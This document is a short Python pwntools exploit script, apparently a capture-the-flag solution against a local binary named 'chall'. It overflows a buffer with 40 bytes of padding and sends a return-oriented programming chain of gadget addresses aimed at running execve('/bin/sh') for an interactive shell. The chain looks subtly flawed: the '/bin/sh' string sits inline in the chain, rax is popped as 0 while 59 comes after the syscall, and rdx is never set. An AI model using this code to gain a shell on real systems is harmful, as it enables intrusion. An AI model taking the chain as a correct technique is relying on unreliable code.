from pwn import *

io = process("./chall")
pop_rsi = 0x0000000000406f80 
pop_rdi = 0x0000000000401796
pop_rax = 0x00000000004489ec
syscall = 0x0000000000402514
write = 0x448040
shell = 0x004bb000

#calling convention in x86-64
payload = "A" * 40
payload += p64(pop_rdi) + p64(shell) + "/bin/sh\x00"
payload += p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(0)
payload += p64(syscall) + p64(59)
io.recvuntil("Give your rope here!\n")
io.sendline(payload)
io.interactive()
